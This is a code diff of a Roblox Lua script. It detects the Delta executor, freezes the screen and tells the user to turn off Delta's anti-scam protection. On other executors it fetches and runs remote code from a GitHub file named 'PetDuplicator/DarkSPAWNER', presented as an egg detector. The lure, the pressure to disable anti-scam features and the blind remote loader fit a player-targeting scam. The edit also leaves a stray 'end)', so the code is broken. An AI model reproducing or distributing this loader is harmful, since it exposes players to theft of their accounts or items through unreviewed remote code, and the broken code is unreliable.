@@ -1,15 +1,3 @@
---[[
-    Delta Executor Detection + Freeze Lock by Nelli (Recreated in Lua for Roblox)
-
-    This script aims to replicate the functionality and visual style of the
-    HTML UI for a Roblox environment. It detects if the script is running
-    on a "Delta" executor, and if so, applies a freeze effect and displays
-    a custom UI with a message and a copy button.
-
-    Note: This is a client-side script (LocalScript) and should be placed
-    in StarterPlayerScripts or PlayerGui.
-]]
-
 local Players = game:GetService("Players")
 local Lighting = game:GetService("Lighting")
 local UserInputService = game:GetService("UserInputService")
@@ -106,7 +94,8 @@ if executor:lower():find("delta") then
     title.Parent = mainFrame
 
     local messageText = Instance.new("TextLabel")
-    messageText.Text = "You're using an unsupported executor (Delta).\n\nTo fix:\n- Turn off anti-scam in Delta\n- Or use Krnl executor.\n\n" -- Updated text from green.png
+    -- Removed "Closing in 59 seconds..." from the text
+    messageText.Text = "You're using an unsupported executor (Delta).\n\nTo fix:\n- Turn off anti-scam in Delta\n- Or use Krnl executor."
     messageText.Font = Enum.Font.Gotham
     messageText.TextSize = 12
     messageText.TextColor3 = Color3.fromRGB(255, 255, 255) -- White from green.png
@@ -157,7 +146,6 @@ if executor:lower():find("delta") then
     end)
 else
     -- ✅ Not Delta → continue loading Egg Detector script (from original user-provided logic)
-    pcall(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/GrowAGarden-updated/PetDuplicator/refs/heads/main/DarkSPAWNER"))()
     end)
 end
